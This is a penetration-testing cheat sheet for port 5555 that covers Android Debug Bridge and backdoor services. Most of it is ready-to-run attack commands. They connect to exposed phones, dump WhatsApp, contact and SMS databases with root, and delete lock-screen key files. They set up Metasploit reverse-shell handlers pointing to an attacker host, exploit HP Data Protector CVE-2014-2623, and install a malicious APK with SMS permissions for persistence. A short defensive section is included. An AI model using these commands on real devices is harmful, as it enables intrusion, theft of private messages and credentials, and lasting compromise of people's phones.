# ADB / COMMON BACKDOOR ENUMERATION (Port 5555/TCP)

## SERVICE OVERVIEW
```
Port 5555/TCP - Dual purpose:
1. Android Debug Bridge (ADB) - Legitimate Android debugging
2. Common backdoor/RAT port - Malicious use

Common uses:
- Android device debugging (ADB)
- Reverse shells (Metasploit, netcat)
- Remote Access Trojans (RATs)
- Bind shells
- HP Data Protector (legacy, CVE-2014-2623)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p5555 <IP>                            # Service/Version detection
nc -nv <IP> 5555                                # Manual connection
telnet <IP> 5555                                # Alternative connection
```

## NMAP ENUMERATION
```bash
# Detect service type
nmap -sV -p5555 <IP>                            # Version detection
nmap -p5555 --script banner <IP>                # Banner grab
nmap -p5555 --script adb-info <IP>              # ADB info (if ADB)

# Comprehensive scan
nmap -sV -p5555 -A <IP> -oA port_5555_scan
```

## ANDROID DEBUG BRIDGE (ADB)
```bash
# If service is ADB:

# Install ADB tools
apt-get install android-tools-adb

# Connect to device
adb connect <IP>:5555

# Verify connection
adb devices                                     # List connected devices

# Shell access
adb shell                                       # Interactive shell
adb shell whoami                                # Execute command

# File operations
adb pull /sdcard/file.txt .                     # Download file
adb push file.txt /sdcard/                      # Upload file

# Install/uninstall apps
adb install app.apk                             # Install APK
adb uninstall com.package.name                  # Uninstall app

# Screen capture
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png .

# Logcat (system logs)
adb logcat                                      # View logs
adb logcat | grep -i password                   # Search for credentials
```

## ADB ENUMERATION
```bash
# After adb shell access:

# System information
getprop ro.product.model                        # Device model
getprop ro.build.version.release                # Android version
getprop ro.serialno                             # Serial number

# User information
whoami                                          # Current user (usually shell)
id                                              # User ID and groups

# Network information
ip addr                                         # IP addresses
netstat -ano                                    # Network connections

# Installed applications
pm list packages                                # All packages
pm list packages -3                             # Third-party apps
pm list packages | grep -i bank                 # Search for specific apps

# File system
ls /sdcard/                                     # SD card contents
ls /data/data/                                  # App data directories
find /sdcard -name "*.txt"                      # Find files

# Sensitive data locations
/sdcard/Download/                               # Downloads
/sdcard/DCIM/                                   # Photos
/data/data/com.android.browser/                 # Browser data
/data/data/com.android.providers.contacts/      # Contacts
/data/data/com.android.providers.telephony/     # SMS/MMS
```

## ADB PRIVILEGE ESCALATION
```bash
# Check if rooted
su                                              # Try to get root
whoami                                          # Check if root

# If rooted, full system access
su -c "cat /data/data/com.whatsapp/databases/msgstore.db"  # WhatsApp messages
su -c "sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db \"SELECT * FROM data\""  # Contacts

# Disable screen lock (requires root)
su -c "rm /data/system/gesture.key"
su -c "rm /data/system/password.key"
```

## BIND SHELL / BACKDOOR
```bash
# If port 5555 is a bind shell:

# Connect with netcat
nc -nv <IP> 5555
rlwrap nc -nv <IP> 5555                         # With readline

# Test for shell
whoami
id
uname -a
hostname

# Upgrade to interactive shell (if Linux)
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Stabilize shell
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
```

## METASPLOIT PAYLOADS
```bash
# Common payloads using port 5555:

msfconsole
use exploit/multi/handler

# Linux reverse shell
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST <attacker_IP>
set LPORT 5555
exploit

# Android reverse shell
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST <attacker_IP>
set LPORT 5555
exploit

# Bind shell connection
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST <target_IP>
set LPORT 5555
exploit
```

## HP DATA PROTECTOR (CVE-2014-2623)
```bash
# Legacy HP Data Protector uses port 5555
# CVE-2014-2623: Remote command execution

# Check if HP Data Protector
nc -nv <IP> 5555
# Look for HP Data Protector banner

# Metasploit exploit
msfconsole
use exploit/multi/misc/hp_data_protector_exec_integutil
set RHOST <IP>
set RPORT 5555
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_IP>
exploit

# Manual exploitation
# Send crafted packet to execute commands
```

## VULNERABILITY SCANNING
```bash
# Search for exploits
searchsploit port 5555
searchsploit adb
searchsploit "hp data protector"

# Nmap vuln scan
nmap -p5555 --script vuln <IP>

# Known vulnerabilities:
# CVE-2014-2623: HP Data Protector RCE
# ADB publicly accessible (misconfiguration)
# Insecure ADB implementations
```

## COMMON MISCONFIGURATIONS
```
☐ ADB exposed to internet (should be localhost only)
☐ ADB enabled on production Android devices
☐ No authentication on ADB (default)
☐ Bind shell backdoor from previous compromise
☐ HP Data Protector unpatched (CVE-2014-2623)
☐ Rooted Android device with ADB access
☐ No firewall blocking port 5555
☐ Sensitive data accessible via ADB
```

## QUICK WIN CHECKLIST
```
☐ Scan for port 5555
☐ Identify service type (ADB, backdoor, HP Data Protector)
☐ If ADB: connect with adb connect <IP>:5555
☐ If ADB: enumerate device (apps, files, logs)
☐ If ADB: check if rooted (su command)
☐ If backdoor: connect with netcat
☐ If HP Data Protector: exploit CVE-2014-2623
☐ Extract sensitive data (credentials, files, databases)
☐ Document findings and IOCs
```

## ONE-LINER ENUMERATION
```bash
# Quick ADB connection
adb connect <IP>:5555 && adb shell "whoami; id; uname -a"

# Test for bind shell
echo "whoami" | nc -nv <IP> 5555

# Nmap detection
nmap -sV -p5555 --script adb-info <IP>
```

## SECURITY IMPLICATIONS
```
RISKS (ADB):
- Full access to Android device
- Data exfiltration (photos, contacts, messages, call logs)
- App installation/uninstallation
- Screen capture and recording
- Credential theft from app databases
- Privacy violation (SMS, WhatsApp, emails)

RISKS (Backdoor):
- Unauthorized remote access
- System compromise
- Data exfiltration
- Lateral movement
- Persistence
- Credential theft

RECOMMENDATIONS:
- Disable ADB on production devices
- Use ADB over USB only (not network)
- Require ADB authentication (Android 4.2.2+)
- Block port 5555 at firewall
- Don't root production Android devices
- Monitor for unusual ADB activity
- Patch HP Data Protector (or migrate away)
- Use EDR/XDR to detect backdoor activity
```

## ADB SECURITY FEATURES
```bash
# ADB authentication (Android 4.2.2+)
# First connection requires physical device authorization
# Public key stored in /data/misc/adb/adb_keys

# Check authorized keys
adb shell cat /data/misc/adb/adb_keys

# Revoke USB debugging authorizations
# Settings > Developer options > Revoke USB debugging authorizations

# Disable ADB over network (requires root)
adb shell setprop service.adb.tcp.port -1
```

## DEFENSIVE DETECTION
```bash
# Monitor for port 5555 activity:

# Check if port 5555 is listening (Linux)
netstat -tulpn | grep 5555
ss -tulpn | grep 5555
lsof -i :5555

# Check process
lsof -i :5555 -t
ps aux | grep $(lsof -i :5555 -t)

# Android: Check if ADB is enabled
adb shell getprop service.adb.tcp.port
# If returns "5555", ADB over network is enabled

# Kill suspicious process
kill -9 $(lsof -i :5555 -t)
```

## TOOLS
```bash
# ADB (Android Debug Bridge)
apt-get install android-tools-adb
adb connect <IP>:5555

# Netcat
nc -nv <IP> 5555
rlwrap nc -nv <IP> 5555

# Nmap
nmap -sV -p5555 --script adb-info <IP>

# Metasploit
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp

# searchsploit
searchsploit adb
searchsploit "hp data protector"
```

## POST-EXPLOITATION (ADB)
```bash
# After ADB access:

# 1. Enumerate device
adb shell "getprop; id; uname -a"

# 2. List installed apps
adb shell pm list packages -f

# 3. Backup app data (requires root)
adb shell su -c "tar -czf /sdcard/backup.tar.gz /data/data/"
adb pull /sdcard/backup.tar.gz .

# 4. Extract databases
adb shell su -c "cp /data/data/com.android.providers.contacts/databases/contacts2.db /sdcard/"
adb pull /sdcard/contacts2.db .
sqlite3 contacts2.db "SELECT * FROM data"

# 5. Screenshot/screen record
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png .

# 6. Keylogger (if rooted and installed)
# Some RATs install keyloggers via ADB
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Attack chain (ADB):

# 1. Discover ADB
nmap -p5555 --open <subnet>

# 2. Connect to device
adb connect <IP>:5555

# 3. Enumerate device
adb shell "getprop; pm list packages"

# 4. Extract sensitive data
adb shell su -c "cat /data/data/com.whatsapp/databases/msgstore.db" > whatsapp.db
adb pull /sdcard/DCIM/ .                        # Photos

# 5. Install backdoor
adb install malicious.apk
adb shell pm grant com.malicious.app android.permission.READ_SMS

# 6. Persistence
# Install persistent RAT via APK

# Attack chain (Backdoor):

# 1. Connect to shell
nc -nv <IP> 5555

# 2. Enumerate system
whoami && id && uname -a

# 3. Privilege escalation
# (exploit SUID, kernel, sudo, etc.)

# 4. Persistence
# Add SSH key, cron job, service

# 5. Lateral movement
# Scan internal network from compromised host
```
